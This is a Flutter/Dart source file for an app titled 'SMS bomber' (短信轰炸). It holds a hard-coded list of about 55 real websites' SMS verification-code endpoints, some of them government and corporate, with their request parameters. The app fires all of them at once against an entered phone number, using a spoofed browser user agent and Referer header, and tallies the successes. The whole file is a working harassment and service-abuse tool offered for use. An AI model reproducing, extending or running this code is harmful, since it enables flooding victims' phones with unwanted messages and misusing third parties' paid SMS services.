import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

const String kUA = 'Mozilla/5.0 (Linux; Android 15; V2405A) AppleWebKit/537.36 '
    '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36';

// 接口库: [方法, URL, 数据JSON]。{p} = 手机号
const List<List<String>> kApis = [
  ['GET', 'https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do', '{"phone":"{p}"}'],
  ['GET', 'https://www.xxwolo.com/users/sendMessage', '{"phone":"{p}","bOK":"true"}'],
  ['GET', 'http://www.tanwan.com/api/reg_json_2019.php', '{"act":"3","phone":"{p}"}'],
  ['GET', 'https://wx.gamesafe.qq.com/cgi/proxy/send_sms', '{"phone_num":"{p}","game_id":"null","uin":"-1"}'],
  ['GET', 'https://applet.mbadashi.com/appletapi/applet/authorizations/smscode', '{"mobile":"{p}"}'],
  ['GET', 'https://shark.x.ufans.cn/bapi/sms', '{"mobile":"{p}"}'],
  ['GET', 'https://apis.niuxuezhang.cn/v1/sms-code', '{"phone":"{p}"}'],
  ['GET', 'https://www.ncsme.cn/ncsme/common/sendVerifyCode', '{"phone":"{p}"}'],
  ['GET', 'http://www.lssmes.cn/regcode.html', '{"mobile":"{p}"}'],
  ['GET', 'https://jdapi.jd100.com/uc/v1/getSMSCode', '{"account":"{p}","sign_type":"1","use_type":"1"}'],
  ['GET', 'https://www.smenx.com.cn/ajax/getregistcode.do', '{"mobilenum":"{p}"}'],
  ['GET', 'http://www.smewf.com/api/index/getVerifyCode', '{"mobile":"{p}","type":"1"}'],
  ['GET', 'https://services.qiye.163.com/service/official/sendCode', '{"mobile":"{p}"}'],
  ['GET', 'https://m.zhanghaojiaoyi.cn/api/api/member/send/regCode', '{"phone":"{p}"}'],
  ['GET', 'https://www.17zhanghao.com/prod-api/sms/sendYzm', '{"phone":"{p}","type":"phoneLogin"}'],
  ['GET', 'http://58.49.165.98:9023/dispatch/case/sendMessage', '{"phoneNum":"{p}"}'],
  ['GET', 'https://www.jncfcj.com/fwzl-applet-client-api/sendSmsCaptcha', '{"phone":"{p}"}'],
  ['GET', 'https://m.luxshare-ict.com/api/Staff/GuestReserveLog/GetTelephoneCode', '{"telephone":"{p}"}'],
  ['GET', 'https://m.doctorpanda.com/panda-h5-web/miniapps/users/sendCode', '{"mobile":"{p}"}'],
  ['GET', 'https://wx.xjbtsy.com/user/smscode', '{"phone":"{p}"}'],
  ['GET', 'https://m.app.yunjiwan.com/api_android/Login/sendVerifiCodeApi', '{"phoneNumber":"{p}"}'],
  ['GET', 'https://ypc-backstage.zhongkediman.com/v2/user/sendSMSCode', '{"phone":"{p}"}'],
  ['GET', 'https://www.isendmail.cn/member/login/mobile/code', '{"mobile":"{p}"}'],
  ['GET', 'http://zydx.top/mob_code.php', '{"type":"reg","mob":"{p}"}'],
  ['GET', 'https://api.portal.cargoon.com/auth/sms', '{"mobile":"{p}"}'],
  ['GET', 'https://ythpt.jsga.gov.cn/jsgawx/sms/sendSmsByMobile', '{"mobile":"{p}"}'],
  ['GET', 'https://qxt.matefix.cn/api/wx/common/sendMsgCode', '{"mobile":"{p}"}'],
  ['GET', 'https://www.pinganbinzhong.com/mpmt-user/login/validateCode', '{"mobile":"{p}"}'],
  ['GET', 'https://api.tuhu.cn/User/GetIdentityCode', '{"Phone":"{p}","type":"0","nationCode":"86"}'],
  ['GET', 'https://m.zol.com.cn/user/ajax/getPhoneCode.php', '{"autype":"1","phone":"{p}"}'],
  ['GET', 'https://igetcool-gateway.igetcool.com/app-api-user-server/white/sms/voice.json', '{"phone":"{p}","smstype":"1"}'],
  ['GET', 'https://api.sdk.49app.com/V7/Accounts/GetCode', '{"callback":"apiRegGetPhoneCode","device":"3","mobile":"{p}"}'],
  ['GET', 'https://dxcyjy.com/api/app/sys/common/sendCode', '{"mobilePhone":"{p}","type":"register"}'],
  ['GET', 'https://www.biteip.cn/index.php', '{"clientid":"mobile","mobile":"{p}","m":"member","c":"index","a":"public_checkmobile_ajax"}'],
  ['GET', 'https://xaybb.yuanchengkj.com/app/sendPwdResetValidCode', '{"mobile":"{p}"}'],
  ['POST_JSON', 'https://a.welife001.com/applet/sendVerifyCode', '{"phone":"{p}"}'],
  ['POST_JSON', 'https://vipapi.beteng.com/VIP/DoSendByCellPhone', '{"ID":0,"Cellphone":"{p}"}'],
  ['POST_JSON', 'http://115.29.195.18/eam/sys/sms', '{"mobile":"{p}","smsmode":"1"}'],
  ['POST_JSON', 'http://61.185.136.37:18083/server/system/msg/sendMsgCode', '{"phone":"{p}"}'],
  ['POST_JSON', 'http://219.145.189.91:7086/server/system/msg/sendMsgCode', '{"phone":"{p}"}'],
  ['POST_JSON', 'http://www.nc12377.cn/api/sms/send.ashx', '{"Mobile":"{p}"}'],
  ['POST_JSON', 'https://api-pt.4366.com/sms/sendCaptcha', '{"mobile":"{p}","scene":"register"}'],
  ['POST_JSON', 'https://www.lbrencai.com/api/home/register/actions/sendSms', '{"mobile":"{p}"}'],
  ['POST_JSON', 'https://wfrcsc.com/hrdp/common/sendSMS', '{"mobile":"{p}","tag":"register","isApp":"false"}'],
  ['POST_JSON', 'http://jmesp.com/api/sms/send', '{"mobile":"{p}","event":"register"}'],
  ['POST_FORM', 'http://www.lugangtong56.com/zuul-lgt/lgt-app-member/wxLogin/sendMessageByRegister', '{"phone":"{p}"}'],
  ['POST_FORM', 'https://www.hheduc.com/sso/usr/sendVerifyCode', '{"receiver":"{p}","type":"PHONE","actionFlag":"REGISTER"}'],
  ['POST_FORM', 'https://www.job0917.com/index.php?c=ajax&a=regcode', '{"mobile":"{p}"}'],
  ['POST_FORM', 'https://www.njkaba.cn/api/sms/send.html', '{"event":"register","mobile":"{p}"}'],
  ['POST_FORM', 'http://www.9377.com/h5/register.php', '{"do":"register","cellphone":"1","send_captcha":"sent","tel":"{p}"}'],
  ['POST_FORM', 'https://www.dongyingjob.com/mobile/members/reg_send_sms.html', '{"sms_type":"login","mobile":"{p}"}'],
  ['POST_FORM', 'https://www.yixuezp.com/person/account/sendMobileVerifyCode', '{"mobile":"{p}"}'],
  ['POST_FORM', 'https://seller.qbb6.com/sendCode/', '{"phone":"{p}","sendType":"0","simple":"0"}'],
  ['POST_FORM', 'https://www.hedaoapp.com/Photo/SendCode', '{"phone":"{p}","type":"0"}'],
  ['POST_FORM', 'https://jgfw.furuifeng.net/api/login/sendSmsCode', '{"mobilePhone":"{p}"}'],
];

class Res {
  final String host;
  final int code;
  final bool good;
  final String body;
  Res(this.host, this.code, this.good, this.body);
}

void main() => runApp(const App());

class App extends StatelessWidget {
  const App({super.key});
  @override
  Widget build(BuildContext c) => MaterialApp(
        title: '短信轰炸',
        theme: ThemeData(colorSchemeSeed: Colors.blue, useMaterial3: true),
        home: const Home(),
      );
}

class Home extends StatefulWidget {
  const Home({super.key});
  @override
  State<Home> createState() => _HomeState();
}

class _HomeState extends State<Home> {
  final _ctrl = TextEditingController();
  final List<Res> _res = [];
  bool _running = false;
  int _done = 0;
  int _ok = 0;

  Future<void> _bomb() async {
    final phone = _ctrl.text.trim();
    if (!RegExp(r'^1\d{10}$').hasMatch(phone)) {
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('请输入 11 位手机号')));
      return;
    }
    setState(() {
      _running = true;
      _res.clear();
      _done = 0;
      _ok = 0;
    });
    await Future.wait(kApis.map((a) => _fire(a, phone)));
    setState(() => _running = false);
  }

  void _push(String host, int code, String body) {
    final good = code == 200 &&
        (body.contains('成功') || body.contains('success') || body.contains('"code":0') || body.contains('"status":1'));
    if (good) _ok++;
    setState(() => _res.add(Res(host, code, good, body)));
    _done++;
  }

  Future<void> _fire(List<String> a, String phone) async {
    final method = a[0];
    final uri = Uri.parse(a[1]);
    final data = (jsonDecode(a[2]) as Map)
        .map((k, v) => MapEntry(k.toString(), v.toString().replaceAll('{p}', phone)));
    final headers = {'User-Agent': kUA, 'Referer': '${uri.scheme}://${uri.host}/'};
    try {
      http.Response r;
      if (method == 'GET') {
        r = await http
            .get(uri.replace(queryParameters: {...uri.queryParameters, ...data}), headers: headers)
            .timeout(const Duration(seconds: 10));
      } else if (method == 'POST_JSON') {
        r = await http
            .post(uri, headers: {...headers, 'Content-Type': 'application/json'}, body: jsonEncode(data))
            .timeout(const Duration(seconds: 10));
      } else {
        r = await http
            .post(uri,
                headers: {...headers, 'Content-Type': 'application/x-www-form-urlencoded'}, body: data)
            .timeout(const Duration(seconds: 10));
      }
      _push(uri.host, r.statusCode, r.body);
    } catch (e) {
      _push(uri.host, -1, '$e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('短信轰炸')),
      body: Column(children: [
        Padding(
          padding: const EdgeInsets.all(12),
          child: Row(children: [
            Expanded(
              child: TextField(
                controller: _ctrl,
                keyboardType: TextInputType.phone,
                decoration: const InputDecoration(labelText: '手机号', border: OutlineInputBorder()),
              ),
            ),
            const SizedBox(width: 8),
            FilledButton(onPressed: _running ? null : _bomb, child: Text(_running ? '轰炸中' : '轰 炸')),
          ]),
        ),
        if (_running) const LinearProgressIndicator(),
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
          child: Row(children: [
            Text('接口 ${kApis.length} 个   已回 $_done   疑似成功 $_ok',
                style: const TextStyle(fontSize: 12, color: Colors.grey)),
          ]),
        ),
        const Divider(height: 1),
        Expanded(
          child: ListView.builder(
            itemCount: _res.length,
            itemBuilder: (c, i) {
              final r = _res[i];
              return ListTile(
                dense: true,
                leading: Icon(
                  r.good ? Icons.check_circle : (r.code == -1 ? Icons.error_outline : Icons.remove_circle_outline),
                  size: 18,
                  color: r.good ? Colors.green : Colors.grey,
                ),
                title: Text(r.host, style: const TextStyle(fontSize: 13)),
                subtitle: Text('${r.code}  ${r.body}',
                    maxLines: 1, overflow: TextOverflow.ellipsis, style: const TextStyle(fontSize: 11)),
              );
            },
          ),
        ),
      ]),
    );
  }
}